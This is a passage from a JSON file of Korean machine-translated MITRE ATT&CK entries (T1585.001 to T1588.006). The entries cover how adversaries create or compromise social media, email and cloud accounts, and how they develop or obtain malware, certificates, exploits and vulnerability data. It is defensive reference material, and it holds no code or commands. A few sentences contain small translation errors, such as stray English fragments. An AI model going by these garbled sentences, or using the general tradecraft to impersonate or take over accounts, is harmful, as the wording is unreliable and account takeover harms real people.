      "description": "위협 행위자는 목표 지향 작업 중 사용할 수 있는 소셜 미디어 계정을 생성하고 관리할 수 있습니다. 이들은 작전을 진행하기 위해 개인 캐릭터를 구축하는 데 사용할 소셜 미디어 계정을 만들 수 있습니다. 캐릭터 개발은 공공 정보, 존재감, 이력 및 적절한 소속 관계의 개발로 구성됩니다.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage)\n\n소셜 엔지니어링을 포함하는 작업에서는 소셜 미디어에서 캐릭터를 활용하는 것이 중요할 수 있습니다. 이러한 캐릭터는 허구일 수도 있고 실제 인물을 가장할 수도 있습니다. 캐릭터는 단일 소셜 미디어 사이트에만 존재할 수도 있고 여러 사이트(예: Facebook, LinkedIn, Twitter 등)에서 존재할 수도 있습니다. 소셜 미디어에서 캐릭터를 구축하기 위해서는 그들이 실제처럼 보이도록 추가 문서 개발이 필요할 수 있습니다. 이는 프로필 정보를 작성하거나, 사회적 네트워크를 개발하거나, 사진을 포함하는 것을 포함할 수 있습니다.\n\n캐릭터가 개발되면 위협 행위자는 이를 사용하여 관심 있는 목표와 연결을 생성할 수 있습니다. 이러한 연결은 직접적일 수도 있고 다른 사람을 통해 연결을 시도하는 것이 포함될 수도 있습니다.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage) 이러한 계정은 초기 접근(예: [서비스를 통한 스피어피싱](https://attack.mitre.org/techniques/T1566/003))과 같은 위협 행위자 생애 주기의 다른 단계에서 활용될 수 있습니다.",
      "external_id": "T1585.001",
      "modified": "2021-10-16T17:37:34.563Z",
      "title": "Social Media Accounts",
      "translated": true
    },
    {
      "description": "위협 행위자들은 타겟팅에 사용될 수 있는 이메일 계정을 생성할 수 있습니다. 이들은 이메일 제공업체를 통해 생성된 계정을 활용하여 정보 탈취를 위한 피싱([Phishing for Information](https://attack.mitre.org/techniques/T1598))이나 일반 피싱([Phishing](https://attack.mitre.org/techniques/T1566))을 수행하는 등의 작업을 진행할 수 있습니다. (출처: Mandiant APT1) 이메일 계정을 설정함으로써 위협 행위자들은 무료 서비스, 예를 들어 체험 기간을 악용하여 후속 목적을 위한 인프라를 획득([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583))할 수 있습니다. (출처: Free Trial PurpleUrchin)\n\n또한, 위협 행위자들은 이메일 계정 주위에 자신의 신원을 형성하기 위해 [소셜 미디어 계정](https://attack.mitre.org/techniques/T1585/001)을 활용하는 등의 조치를 취할 수 있으며, 이를 통해 후속 행동의 성공 가능성을 높일 수 있습니다. 생성된 이메일 계정은 인프라 acquisiton(예: [도메인](https://attack.mitre.org/techniques/T1583/001))에도 사용될 수 있습니다. (출처: Mandiant APT1)\n\n작업을 자신에게 물리적으로 연결되는 위험을 줄이기 위해, 위협 행위자들은 일회용 이메일 서비스를 사용할 수 있습니다. (출처: Trend Micro R980 2016)",
      "external_id": "T1585.002",
      "modified": "2024-02-28T21:11:27.088Z",
      "title": "Email Accounts",
      "translated": true
    },
    {
      "description": "적대 세력은 타겟팅 중 사용할 수 있는 클라우드 제공업체에 계정을 생성할 수 있습니다. 이들은 클라우드 계정을 사용하여 Dropbox, MEGA, Microsoft OneDrive 또는 AWS S3 버킷과 같은 클라우드 저장 서비스의 기능을 활용하여 [클라우드 저장소로의 데이터 유출](https://attack.mitre.org/techniques/T1567/002) 또는 [툴 업로드](https://attack.mitre.org/techniques/T1608/002)를 진행할 수 있습니다. 클라우드 계정은 또한 [가상 사설 서버](https://attack.mitre.org/techniques/T1583/003)나 [서버리스](https://attack.mitre.org/techniques/T1583/007) 인프라와 같은 인프라를 획득하는 데도 사용될 수 있습니다. 클라우드 계정을 설정함으로써 적대 세력은 자체 서버를 관리하지 않고도 정교한 기능을 개발할 수 있습니다. (출처: Awake Security C2 클라우드)\n\n[클라우드 계정](https://attack.mitre.org/techniques/T1585/003)을 생성하기 위해서는 적대 세력이 클라우드 제공업체에 등록하기 위해 [이메일 계정](https://attack.mitre.org/techniques/T1585/002)을 설정해야 할 수도 있습니다.",
      "external_id": "T1585.003",
      "modified": "2022-10-25T15:49:14.785Z",
      "title": "Cloud Accounts",
      "translated": true
    },
    {
      "description": "적대 세력은 목표를 설정하는 데 사용할 수 있는 서비스 계정을 타락시킬 수 있습니다. 사회 공학을 포함하는 작업의 경우, 온라인 페르소나의 활용이 중요할 수 있습니다. 계정을 새로 만들고 관리하는 대신(즉, [계정 설정](https://attack.mitre.org/techniques/T1585)), 적대 세력은 기존 계정을 타락시킬 수 있습니다. 기존 페르소나를 활용하면 피해자가 타락된 페르소나와 관계가 있거나 알고 있을 경우 신뢰를 얻을 수 있습니다.\n\n계정을 타락시키는 데에는 몇 가지 방법이 존재합니다. 예를 들어, [정보 피싱](https://attack.mitre.org/techniques/T1598)을 통해 자격 증명을 수집하거나, 제3자 사이트에서 자격 증명을 구매하거나, 자격 증명을 무작위로 대입(brute forcing)하는 방법(예: 데이터 유출에서의 비밀번호 재사용), 또는 직원, 공급업체 또는 비즈니스 파트너에게 자격 증명에 접근하기 위해 비용을 지불하는 방법이 있습니다.(인용: AnonHBGary)(인용: Microsoft DEV-0537) 계정을 타락시키기 전에, 적대 세력은Reconnaissance를 수행하여 어떤 계정을 타락시킬지에 대한 결정을 내리기 위한 정보를 수집할 수 있습니다.\n\n페르소나는 단일 사이트 또는 여러 사이트(예: Facebook, LinkedIn, Twitter, Google 등)에 존재할 수 있습니다. 타락된 계정은 추가 개발이 필요할 수 있으며, 여기에는 프로필 정보를 채우거나 수정하고, 사회적 네트워크를 더욱 발전시키거나, 사진을 포함하는 것이 포함될 수 있습니다.\n\n적대 세력은 타락된 이메일 계정을 직접 활용하여 [정보 피싱](https://attack.mitre.org/techniques/T1598)이나 [피싱](https://attack.mitre.org/techniques/T1566)을 수행할 수 있습니다.",
      "external_id": "T1586",
      "modified": "2023-04-11T01:08:56.774Z",
      "title": "Compromise Accounts",
      "translated": true
    },
    {
      "description": "적대자는 목표 설정 중에 사용할 수 있는 소셜 미디어 계정을 손상시킬 수 있습니다. 사회 공학을 포함하는 작전에서는 온라인 페르소나의 활용이 중요할 수 있습니다. 소셜 미디어 프로필을 새로 만들고 기르기보다는(예: [소셜 미디어 계정](https://attack.mitre.org/techniques/T1585/001)), 적대자는 기존의 소셜 미디어 계정을 손상시킬 수 있습니다. 기존의 페르소나를 활용하면, 손상된 페르소나와 관계가 있거나 알고 있는 잠재적 피해자에게 신뢰를 형성할 수 있습니다.\n\n소셜 미디어 계정을 손상시키기 위한 다양한 방법이 존재합니다. 여기에는 [정보 피싱](https://attack.mitre.org/techniques/T1598)을 통해 자격 증명을 수집하거나, 타사 사이트에서 자격 증명을 구매하거나, 자격 증명을 무작위로 시도하는 방법(예: 유출된 자격 증명을 통한 비밀번호 재사용) 등이 있습니다.(인용: AnonHBGary) 소셜 미디어 계정을 손상시키기 전에, 적대자는 어떤 계정을 손상시킬지 결정하기 위해 정찰 활동을 수행할 수 있습니다.\n\n페르소나는 단일 사이트 또는 여러 사이트에 존재할 수 있습니다(예: Facebook, LinkedIn, Twitter 등). 손상된 소셜 미디어 계정은 추가 개발이 필요할 수 있으며, 여기에는 프로필 정보 작성 또는 수정, 소셜 네트워크 추가 개발, 사진 포함 등이 포함될 수 있습니다.\n\n적대자는 손상된 소셜 미디어 프로필을 사용하여 새로운 연결을 생성하거나 기존 연결을 탈취하여 관심 대상에 접근할 수 있습니다. 이러한 연결은 직접적일 수도 있고, 다른 사람을 통해 연결을 시도할 수도 있습니다.(인용: NEWSCASTER2014)(인용: BlackHatRobinSage) 손상된 프로필은 초기 접근(예: [서비스를 통한 스피어 피싱](https://attack.mitre.org/techniques/T1566/003))과 같은 적대자 생애 주기의 다른 단계에서도 활용될 수 있습니다.",
      "external_id": "T1586.001",
      "modified": "2021-10-16T17:15:12.169Z",
      "title": "Social Media Accounts",
      "translated": true
    },
    {
      "description": "적대자는 타겟팅 중 사용할 수 있는 이메일 계정을 침해할 수 있습니다. 침해된 이메일 계정은 정보 피싱([Phishing for Information](https://attack.mitre.org/techniques/T1598)), 피싱([Phishing](https://attack.mitre.org/techniques/T1566)), 또는 대규모 스팸 이메일 캠페인을 수행하는 등 작전을 진행하는 데 활용될 수 있습니다. 피해자가 침해된 페르소나와 관계를 갖고 있거나 해당 페르소나에 대한 정보를 알고 있는 경우, 침해된 이메일 계정의 기존 페르소나를 이용하면 잠재적인 피해자에게 신뢰를 주는 효과를 야기할 수 있습니다. 또한, 침해된 이메일 계정은 인프라를 획득하는 데에도 사용될 수 있습니다(예: [도메인](https://attack.mitre.org/techniques/T1583/001)).\n\n이메일 계정을 침해하는 방법에는 다양한 방법이 있으며, 정보 피싱([Phishing for Information](https://attack.mitre.org/techniques/T1598) )을 통해 자격증명을 수집하거나, 제3자 사이트에서 자격증명을 구매하거나, 자격증명을 무차별 대입(brute forcing)하는 것(예: 유출된 자격증명 데이터에서 비밀번호 재사용), 또는 직원, 공급업체, 또는 비즈니스 파트너에게 자격증명에 대한 접근을 위해 비용을 지불하는 것이 포함됩니다. (인용: AnonHBGary)(인용: Microsoft DEV-0537) 이메일 계정을 침해하기 전에, 적대자는 작전을 진행하기 위해 어떤 계정을 침해할지에 대한 결정을 알리기 위해 정찰을 수행할 수 있습니다. 적대자는 잘 알려진 이메일 계정 또는 악성 스팸 또는 피싱([Phishing](https://attack.mitre.org/techniques/T1566) ) 이메일이 평판 기반 이메일 필터링 규칙을 회피할 수 있는 도메인을 목표로 할 수 있습니다.\n\n적대자는 침해된 이메일 계정을 사용하여 관심 있는 대상과의 기존 이메일 스레드를 탈취할 수 있습니다.",
      "external_id": "T1586.002",
      "modified": "2023-04-11T01:07:48.218Z",
      "title": "Email Accounts",
      "translated": true
    },
    {
      "description": "적대 세력은 타겟팅 과정에서 사용할 수 있는 클라우드 계정을 손상시킬 수 있습니다. 이들은 손상된 클라우드 계정을 사용하여 운영을 촉진할 수 있으며, 여기에는 Dropbox, Microsoft OneDrive 또는 AWS S3 버킷과 같은 클라우드 저장소 서비스를 활용하여 [클라우드 저장소로의 데이터 유출](https://attack.mitre.org/techniques/T1567/002) 또는 [도구 업로드](https://attack.mitre.org/techniques/T1608/002)를 수행하는 것이 포함됩니다. 클라우드 계정은 [가상 사설 서버](https://attack.mitre.org/techniques/T1583/003)나 [서버리스](https://attack.mitre.org/techniques/T1583/007) 인프라의 획득에도 사용될 수 있습니다. 또한, Twilio, SendGrid, AWS 최종 사용자 메시징, AWS SNS(단순 알림 서비스) 또는 AWS SES(단순 이메일 서비스)와 같은 클라우드 기반 메시징 서비스는 스팸이나 [피싱](https://attack.mitre.org/techniques/T1566)에 활용될 수 있습니다. (인용: Palo Alto Unit 42의 손상된 클라우드 컴퓨트 자격 증명 2022) (인용: Netcraft SendGrid 2024) 클라우드 계정의 손상은 적대 세력이 자체 서버를 관리하지 않고도 정교한 기능을 개발할 수 있도록 할 수 있습니다. (인용: Awake Security C2 Cloud)\n\n클라우드 계정을 손상시키기 위한 다양한 방법이 존재하며, 여기에는 [정보를 위한 피싱](https://attack.mitre.org/techniques/T1598) 방식으로 자격 증명을 수집하거나, 제3자 사이트에서 자격 증명을 구매하는 것, [패스워드 스프레이](https://attack.mitre.org/techniques/T1110/003) 공격을 수행하거나, [응용 프로그램 액세스 토큰 훔치기](https://attack.mitre.org/techniques/T1528)를 시도하는 것이 포함됩니다. (인용: MSTIC Nobelium 2021년 10월) 클라우드 계정을 손상시키기 전에 적대 세력은 정찰을 실시하여 어떤 계정을 손상시킬지 결정하는 데 정보를 얻을 수 있습니다. 경우에 따라, 적대 세력은 서비스 제공업체와 고객 간의 [신뢰할 수 있는 관계](https://attack.mitre.org/techniques/T1199)를 활용할 의도로 특권이 있는 서비스 제공업체 계정을 공격할 수 있습니다. (인용: MSTIC Nobelium 2021년 10월)",
      "external_id": "T1586.003",
      "modified": "2024-10-16T21:26:36.312Z",
      "title": "Cloud Accounts",
      "translated": true
    },
    {
      "description": "공격자는 타겟팅 중에 사용할 수 있는 능력을 구축할 수 있습니다. 능력을 구매하거나, 무료 다운로드 하거나, 도용하는 대신, 공격자는 자체적으로 능력을 개발할 수 있습니다. 이는 개발 요구 사항을 식별하고 악성 코드, 익스플로잇 및 자체 서명된 인증서와 같은 솔루션을 구축하는 과정입니다. 공격자는 적대적 생애 주기의 여러 단계에서 운영을 지원하기 위해 능력을 개발할 수 있습니다. (인용: Mandiant APT1)(인용: Kaspersky Sofacy)(인용: Bitdefender StrongPity 2020년 6월)(인용: Talos Promethium 2020년 6월)\n\n정당한 개발 노력과 마찬가지로, 능력을 개발하는 데 필요한 다양한 기술 세트가 필요할 수 있습니다. 필요한 기술은 내부에 있을 수도 있고, 외부 계약자를 통해 확보해야 할 수도 있습니다. 계약자를 사용하는 것은 공격자의 개발 능력이 연장된 것으로 간주될 수 있으며, 이 경우 공격자는 요구 사항을 형성하는 데 역할을 하고 능력에 대한 독점성을 유지해야 합니다.",
      "external_id": "T1587",
      "modified": "2024-10-15T16:31:17.270Z",
      "title": "Develop Capabilities",
      "translated": true
    },
    {
      "description": "적의들은 타겟팅 과정에서 사용할 수 있는 악성코드 및 악성코드 구성 요소를 개발할 수 있습니다. 악성 소프트웨어 구축에는 페이로드, 드로퍼, 후속 침해 도구, 백도어(백도어가 포함된 이미지 포함), 패커, C2 프로토콜 개발 및 감염된 이동식 미디어 생성이 포함될 수 있습니다. 적의들은 원격 시스템에 대한 제어를 유지하고, 방어를 회피하며, 침해 후 행동을 실행하기 위해 지원할 수 있는 악성코드를 개발할 수 있습니다.(출처: Mandiant APT1)(출처: Kaspersky Sofacy)(출처: ActiveMalwareEnergy)(출처: FBI Flash FIN7 USB)\n\n합법적인 개발 노력과 마찬가지로, 악성코드를 개발하기 위해서는 다양한 기술 세트가 필요할 수 있습니다. 필요한 기술은 사내에 있을 수도 있고, 외부에 계약을 통해 확보해야 할 수도 있습니다. 계약자를 사용하는 것은 적의의 악성코드 개발 능력을 확장하는 것으로 간주될 수 있으며, 이를 위해 적이 요구 사항 형성에 관여하고 악성코드의 독점성을 유지해야 합니다.\n\nC2 프로토콜 개발과 같은 악성코드 개발의 일부 측면은 적이 추가 인프라를 확보해야 할 수도 있습니다. 예를 들어, Twitter와 통신하여 C2를 위한 악성코드 개발은 [웹 서비스](https://attack.mitre.org/techniques/T1583/006)를 사용할 필요가 있을 수 있습니다.(출처: FireEye APT29)",
      "external_id": "T1587.001",
      "modified": "2022-01-14T17:14:27.890Z",
      "title": "Malware",
      "translated": true
    },
    {
      "description": "적대자들은 타겟팅 중에 사용할 수 있는 자체 서명된 코드 서명 인증서를 생성할 수 있습니다. 코드 서명은 실행 파일 및 스크립트에 디지털 서명을 하여 소프트웨어 저자를 확인하고 코드가 수정되거나 손상되지 않았음을 보장하는 과정입니다. 코드 서명은 개발자로부터 프로그램의 신뢰성 수준을 제공하며, 프로그램이 변조되지 않았음을 보장합니다. (출처: Wikipedia Code Signing) 사용자 및/또는 보안 도구는 인증서를 발급한 주체나 저자가 누구인지 알지 못하더라도 서명된 코드 조각을 서명되지 않은 코드 조각보다 더 신뢰할 수 있습니다.\n\n[코드 서명](https://attack.mitre.org/techniques/T1553/002) 이전에, 적대자들은 작업에 사용할 수 있는 자체 서명된 코드 서명 인증서를 개발할 수 있습니다.",
      "external_id": "T1587.002",
      "modified": "2021-10-17T16:07:08.549Z",
      "title": "Code Signing Certificates",
      "translated": true
    },
    {
      "description": "공격자는 타겟팅 과정에서 사용할 수 있는 자체 서명된 SSL/TLS 인증서를 생성할 수 있습니다. SSL/TLS 인증서는 신뢰를 심어주기 위해 설계되었으며, 키에 대한 정보, 소유자의 신원에 대한 정보, 인증서의 내용을 검증한 주체의 디지털 서명이 포함되어 있습니다. 서명이 유효하고, 인증서를 검토하는 사람이 서명자를 신뢰한다면, 해당 키를 소유자와 통신하는 데 사용할 수 있다는 것을 알 수 있습니다. 그러나 자체 서명된 경우, 디지털 인증서는 제3자 인증 기관(CA)의 서명과 관련된 신뢰 요소가 부족합니다.\n\n공격자는 자율적인 운영을 위해 자체 서명된 SSL/TLS 인증서를 생성할 수 있으며, 이는 C2 트래픽을 암호화하는 데 사용되거나(ne: [비대칭 암호화](https://attack.mitre.org/techniques/T1573/002)와 [웹 프로토콜](https://attack.mitre.org/techniques/T1071/001)) 또는 [중간자 공격(Adversary-in-the-Middle)](https://attack.mitre.org/techniques/T1557)을 촉진하는 데 사용될 수 있습니다. 중간자 공격이 가능하도록 하려면 신뢰 루트에 추가하는 작업(예: [루트 인증서 설치](https://attack.mitre.org/techniques/T1553/004))이 필요합니다.\n\n디지털 인증서를 생성한 후, 공격자는 해당 인증서를 자신이 통제하는 인프라에 설치할 수 있습니다(참고: [디지털 인증서 설치](https://attack.mitre.org/techniques/T1608/003)).",
      "external_id": "T1587.003",
      "modified": "2021-10-16T17:32:34.604Z",
      "title": "Digital Certificates",
      "translated": true
    },
    {
      "description": "적대자는 목표 설정 중에 사용할 수 있는 익스플로잇을 개발할 수 있습니다. 익스플로잇은 버그나 취약점을 이용하여 컴퓨터 하드웨어나 소프트웨어에서 의도하지 않거나 예상치 못한 동작이 발생하게 합니다. 온라인에서 익스플로잇을 찾거나 수정하거나, 익스플로잇 공급자로부터 구매하는 대신, 적대자는 자신의 익스플로잇을 개발할 수 있습니다(참고: NYTStuxnet). 적대자는 [취약점](https://attack.mitre.org/techniques/T1588/006)을 통해 획득한 정보를 사용하여 익스플로잇 개발 노력을 집중할 수 있습니다. 익스플로잇 개발 과정의 일환으로, 적대자는 퍼징(fuzzing) 및 패치 분석(patch analysis)과 같은 방법을 통해 악용 가능한 취약점을 발견할 수 있습니다(참고: Irongeek Sims BSides 2017).\n\n합법적인 개발 활동과 마찬가지로, 익스플로잇을 개발하기 위해서는 다양한 기술 세트가 필요할 수 있습니다. 필요한 기술이 내부에 있을 수도 있고 외부에 계약을 맡겨야 할 수도 있습니다. 계약자의 사용은 적대자가 요구 사항을 형성하는 데 역할을 하고 익스플로잇에 대한 초기 독점성을 유지하는 한, 해당 적대자의 익스플로잇 개발 능력을 확장하는 것으로 간주될 수 있습니다.\n\n적대자는 적대자 생애 주기의 다양한 단계에서 익스플로잇을 사용할 수 있습니다(즉, [공공 애플리케이션 익스플로잇](https://attack.mitre.org/techniques/T1190), [클라이언트 실행을 위한 익스플로잇](https://attack.mitre.org/techniques/T1203), [권한 상승을 위한 익스플로잇](https://attack.mitre.org/techniques/T1068), [방어 회피를 위한 익스플로잇](https://attack.mitre.org/techniques/T1211), [자격 증명 접근을 위한 익스플로잇](https://attack.mitre.org/techniques/T1212), [원격 서비스의 익스플로잇](https://attack.mitre.org/techniques/T1210), 및 [애플리케이션 또는 시스템 익스플로잇](https://attack.mitre.org/techniques/T1499/004)).",
      "external_id": "T1587.004",
      "modified": "2021-04-15T03:07:53.803Z",
      "title": "Exploits",
      "translated": true
    },
    {
      "description": "적대자는 타겟팅 과정에서 사용할 수 있는 기술을 구입하거나 훔칠 수 있습니다. 자사 내에서 자체적인 기술을 개발하기보다는, 적대자는 이를 구매하거나 무료로 다운로드하거나 탈취할 수 있습니다. 이러한 활동은 악성코드, 소프트웨어(라이선스 포함), 익스플로이트, 인증서 및 취약성과 관련된 정보의 획득을 포함할 수 있습니다. 적대자는 적대자 생애 주기의 여러 단계에서 운영을 지원하기 위한 기술을 확보할 수 있습니다.\n\n인터넷에서 무료 악성코드, 소프트웨어 및 익스플로이트를 다운로드하는 것 외에도, 적대자는 이러한 기술을 제3자(entity)로부터 구매할 수 있습니다. 제3자에는 악성코드와 익스플로이트 전문 기술 회사, 범죄 시장, 또는 개인이 포함될 수 있습니다.(출처: NationsBuying)(출처: PegasusCitizenLab)\n\n기술을 구매하는 것 외에도, 적대자는 제3자(entity)로부터(다른 적대자 포함) 기술을 훔칠 수도 있습니다. 여기에는 소프트웨어 라이선스, 악성코드, SSL/TLS 및 코드 서명 인증서의 탈취 또는 취약점이나 익스플로이트의 폐쇄된 데이터베이스를 습격하는 것이 포함될 수 있습니다.(출처: DiginotarCompromise)",
      "external_id": "T1588",
      "modified": "2024-09-16T16:19:41.568Z",
      "title": "Obtain Capabilities",
      "translated": true
    },
    {
      "description": "적대자는 타겟팅 중에 사용될 수 있는 악성 소프트웨어를 구매, 도용 또는 다운로드할 수 있습니다. 악성 소프트웨어는 페이로드, 드로퍼, 후속 침해 도구, 백도어, 패커 및 C2 프로토콜을 포함할 수 있습니다. 적대자는 원격 시스템에 대한 제어를 유지하고, 방어를 회피하며, 침해 후 행동을 수행하기 위한 수단으로 악성 소프트웨어를 획득할 수 있습니다.\n\n인터넷에서 무료 악성 소프트웨어를 다운로드하는 것 외에도, 적대자는 이러한 기능을 제3자에서 구매할 수 있습니다. 제3자는 악성 소프트웨어 개발을 전문으로 하는 기술 회사, 범죄 시장(악성 소프트웨어 서비스( Malware-as-a-Service, MaaS) 포함) 또는 개인이 될 수 있습니다. 악성 소프트웨어를 구매하는 것 외에도, 적대자는 제3자(다른 적대자 포함)로부터 악성 소프트웨어를 도용하고 재사용할 수 있습니다.",
      "external_id": "T1588.001",
      "modified": "2021-10-17T16:15:52.805Z",
      "title": "Malware",
      "translated": true
    },
    {
      "description": "적대자는 목표를 설정하는 과정에서 사용할 수 있는 소프트웨어 도구를 구입, 훔치거나 다운로드할 수 있습니다. 이러한 도구는 오픈 소스 또는 폐쇄형 소스, 무료 또는 상용 소프트웨어가 될 수 있습니다. 도구는 적대자에 의해 악의적인 목적으로 사용될 수 있지만 (맬웨어와는 달리) 그런 용도로 사용될 의도로 제작되지 않았습니다 (예: [PsExec](https://attack.mitre.org/software/S0029)). 도구 획득은 상용 소프트웨어 라이선스의 조달을 포함할 수 있으며, 여기에는 [Cobalt Strike](https://attack.mitre.org/software/S0154)와 같은 레드 팀 도구도 포함됩니다. 상용 소프트웨어는 구매를 통해, 라이선스(또는 라이선스가 있는 소프트웨어 복사본)를 훔치거나 평가판 버전을 크랙함으로써 획득할 수 있습니다. (출처: Recorded Future Beacon 2019)\n\n적대자는 운영을 지원하기 위해 도구를 획득할 수 있으며, 여기에는 침해 후 행동 실행을 지원하는 것도 포함됩니다. 적대자는 소프트웨어를 무료로 다운로드하거나 구매하는 것 외에도 제3자(다른 적대자를 포함)로부터 소프트웨어 및/또는 소프트웨어 라이선스를 훔칠 수 있습니다.",
      "external_id": "T1588.002",
      "modified": "2024-09-16T16:20:16.431Z",
      "title": "Tool",
      "translated": true
    },
    {
      "description": "적대 세력은 타겟팅 과정에서 사용할 수 있는 코드 서명 인증서를 구매하거나 도용할 수 있습니다. 코드 서명은 실행 파일 및 스크립트에 디지털 서명을 추가하여 소프트웨어 저자를 확인하고 코드가 변경되거나 손상되지 않았음을 보장하는 과정입니다. 코드 서명은 개발자로부터 프로그램에 대한 진정성을 보장하고 프로그램이 변조되지 않았음을 보증하는 수준의 신뢰성을 제공합니다. (출처: 위키백과 코드 서명) 사용자 및 보안 도구는 인증서를 발급한 주체나 저자를 알지 못하더라도 서명된 코드 조각을 서명되지 않은 코드 조각보다 더 신뢰할 수 있습니다.\n\n[코드 서명](https://attack.mitre.org/techniques/T1553/002) 이전에, 적대 세력은 운영에 사용하기 위해 코드 서명 인증서를 구매하거나 도용할 수 있습니다. 코드 서명 인증서의 구매는 프런트 조직을 이용하거나 이전에 침해된 엔티티에서 도용한 정보를 사용하여 적대 세력이 인증서 제공자에게 해당 엔티티로서 인증할 수 있도록 할 수 있습니다. 적대 세력은 침해당한 제3자로부터 코드 서명 자료를 직접 도용할 수도 있습니다.",
      "external_id": "T1588.003",
      "modified": "2021-10-17T16:19:50.018Z",
      "title": "Code Signing Certificates",
      "translated": true
    },
    {
      "description": "적대 세력은 타겟팅 과정에서 사용할 수 있는 SSL/TLS 인증서를 구매하거나 도용할 수 있습니다. SSL/TLS 인증서는 신뢰를 주기 위해 설계된 것으로, 키에 대한 정보, 소유자의 신원 정보, 인증서 내용이 올바른지 검증한 주체의 디지털 서명을 포함합니다. 서명이 유효하고 인증서를 검사하는 사람이 서명자를 신뢰한다면, 그 사람은 해당 키를 사용하여 소유자와 통신할 수 있음을 알게 됩니다.\n\n적대 세력은 C2 트래픽을 암호화하기 위해 SSL/TLS 인증서를 구매하거나 도용하며, 예를 들어 [비대칭 암호화](https://attack.mitre.org/techniques/T1573/002)와 [웹 프로토콜](https://attack.mitre.org/techniques/T1071/001)을 사용할 수 있습니다. 혹은 인증서가 신뢰되거나 신뢰 루트에 추가된 경우 [중간자 공격](https://attack.mitre.org/techniques/T1557)을 가능하게 할 수도 있습니다 (예: [루트 인증서 설치](https://attack.mitre.org/techniques/T1553/004)). 디지털 인증서 구매는 전면 조직을 사용하거나, 이전에 침해된 주체로부터 도용한 정보를 사용하여 적대 세력이 인증서 제공자에게 해당 주체로서 자신을 검증할 수 있도록 합니다. 또한, 적대 세력은 인증 기관을 포함한 타사로부터 인증서 자료를 직접 도용할 수 있습니다. (출처: DiginotarCompromise) 적대 세력은 나중에 SSL/TLS 인증서를 구매할 도메인을 등록하거나 탈취할 수도 있습니다.\n\n일부 인증 기관은 적대 세력이 무료로 SSL/TLS 인증서, 예를 들어 도메인 검증 인증서를 취득할 수 있도록 허용합니다. (출처: Let's Encrypt FAQ)\n\n디지털 인증서를 획득한 후, 적대 세력은 해당 인증서를 설치할 수 있습니다 (참조: [디지털 인증서 설치](https://attack.mitre.org/techniques/T1608/003)) 그들이 통제하는 인프라에 설치합니다.",
      "external_id": "T1588.004",
      "modified": "2024-09-16T16:19:41.567Z",
      "title": "Digital Certificates",
      "translated": true
    },
    {
      "description": "적대자들은 타겟팅 중에 사용할 수 있는 익스플로잇을 구매, 도난, 또는 다운로드할 수 있습니다. 익스플로잇은 컴퓨터 하드웨어나 소프트웨어에서 의도하지 않거나 예기치 않은 동작이 발생하도록 하게끔 버그나 취약점을 이용합니다. 자신만의 익스플로잇을 개발하기보다는, 적대자는 온라인에서 익스플로잇을 찾아 수정하거나, 익스플로잇 공급업체로부터 구매할 수 있습니다. (출처: Exploit Database)(출처: TempertonDarkHotel)(출처: NationsBuying)\n\n인터넷에서 무료 익스플로잇을 다운로드하는 것 외에도, 적대자들은 제3자 업체로부터 익스플로잇을 구매할 수 있습니다. 제3자 업체는 익스플로잇 개발을 전문으로 하는 기술 회사, 범죄 시장(익스플로잇 킷 포함), 또는 개인 등을 포함할 수 있습니다. (출처: PegasusCitizenLab)(출처: Wired SandCat Oct 2019) 익스플로잇을 구매하는 것 외에도, 적대자들은 제3자 업체(다른 적대자 포함)로부터 익스플로잇을 도 stolen하고 재사용할 수 있습니다. (출처: TempertonDarkHotel)\n\n적대자는 익스플로잇 제공자 포럼을 모니터링하여 기존의 익스플로잇과 새롭게 발견된 익스플로잇의 상태를 이해할 수 있습니다. 익스플로잇이 발견되고 공개되기까지는 일반적으로 지연이 발생합니다. 적대자는 익스플로잇 연구 및 개발을 수행하는 사람들의 시스템을 타겟으로 하여 후속 작전에서 사용할 수 있는 지식을 얻을 수 있습니다.\n\n적대자들은 적대자 생애 주기의 다양한 단계에서 익스플로잇을 사용할 수 있습니다(예: [공식 애플리케이션 익스플로잇](https://attack.mitre.org/techniques/T1190), [클라이언트 실행을 위한 익스플로잇](https://attack.mitre.org/techniques/T1203), [권한 상승을 위한 익스플로잇](https://attack.mitre.org/techniques/T1068), [방어 회피를 위한 익스플로잇](https://attack.mitre.org/techniques/T1211), [자격 증명 접근을 위한 익스플로잇](https://attack.mitre.org/techniques/T1212), [원격 서비스 익스플로잇](https://attack.mitre.org/techniques/T1210), [애플리케이션 또는 시스템 익스플로잇](https://attack.mitre.org/techniques/T1499/004)).",
      "external_id": "T1588.005",
      "modified": "2021-04-15T03:14:01.255Z",
      "title": "Exploits",
      "translated": true
    },
    {
      "description": "적대자는 타겟팅 중에 사용할 수 있는 취약성에 대한 정보를 획득할 수 있습니다. 취약성이란 컴퓨터 하드웨어 또는 소프트웨어의 약점으로, 이는 적대자가 의도하지 않거나 예상치 못한 행동을 발생시킬 수 있도록 악용될 수 있습니다. 적대자는 공개 데이터베이스를 검색하거나 비공식 취약성 데이터베이스에 접근하여 취약성 정보를 찾을 수 있습니다.(출처: 국가 취약성 데이터베이스)\n\n적대자는 기존 및 새로 발견된 취약성의 상태를 이해하기 위해 취약성 공개/데이터베이스를 모니터링할 수 있습니다. 취약성이 발견되고 공개되기까지는 일반적으로 시간이 지연됩니다. 적대자는 취약성 연구를 수행하는 것으로 알려진 시스템(상업적 공급업체 포함)을 타겟으로 삼을 수 있습니다. 취약성에 대한 지식은 적대자가 기존의 익스플로잇을 검색하도록 하거나(예: [Exploits](https://attack.mitre.org/techniques/T1588/005)), 스스로 익스플로잇을 개발하려고 시도하게 할 수 있습니다(예: [Exploits](https://attack.mitre.org/techniques/T1587/004)).",
      "external_id": "T1588.006",
      "modified": "2021-04-15T03:16:32.119Z",
      "title": "Vulnerabilities",
      "translated": true
    },
    {
